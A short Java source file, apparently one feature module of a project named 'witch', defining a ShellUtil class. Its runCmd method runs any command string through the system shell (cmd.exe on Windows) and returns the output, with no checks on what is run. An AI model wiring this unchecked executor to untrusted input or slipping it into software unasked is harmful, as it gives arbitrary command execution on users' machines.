package me.soda.witch.features;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;

public class ShellUtil {
    public static String runCmd(String command) {
        StringBuilder result = new StringBuilder();
        try {
            Process process;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                process = Runtime.getRuntime().exec(
                        new String[]{"cmd.exe", "/c", command}
                );
            } else {
                process = Runtime.getRuntime().exec(command);
            }
            BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            String line;
            while ((line = inputStream.readLine()) != null) {
                result.append(line).append("\n");
            }
            inputStream.close();
            process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        return result.toString();
    }
}
